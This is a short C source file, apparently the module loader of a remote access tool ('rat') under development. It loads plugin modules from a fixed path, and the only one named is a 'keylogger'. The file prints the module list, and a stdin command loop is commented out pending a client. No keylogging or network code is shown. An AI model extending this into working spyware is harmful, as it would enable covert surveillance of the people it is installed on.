#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dlfcn.h>

#include "mod.c"
#include "debug.c"

#define COMMAND_SIZE 256

void
list_modules(void) {
    int i;
    Module *mod;
    write(1, "Modules:", strlen("Modules:"));
    write(1, "\n", 1);

    for (i = 0;i < _modules_size;++i) {
        mod = modules[ i ];

        write(1, "\t", 1);
        write(1, mod->name, strlen(mod->name));
        write(1, "\n", 1);
    }
    write(1, "\n", 1);
}

void
load_all_modules(char *mods[], char *mod_path) {
    char **mod_name = mods;
    while (*mod_name != NULL) {
        load_module(*mod_name, mod_path);
        *mod_name++;
    }
}

int main(void) {
    char *mod_path = "/home/venus/projects/rat/modules/";
    char *mods[] = {
        "keylogger",
        NULL
    };

    load_all_modules(mods, mod_path);
    list_modules();
    clean_modules();
    /*
     * Debug code until we write the client

    char command[COMMAND_SIZE];

    while (1) {
         fgets( command, COMMAND_SIZE, stdin );

    }
    */

    return 0;
}
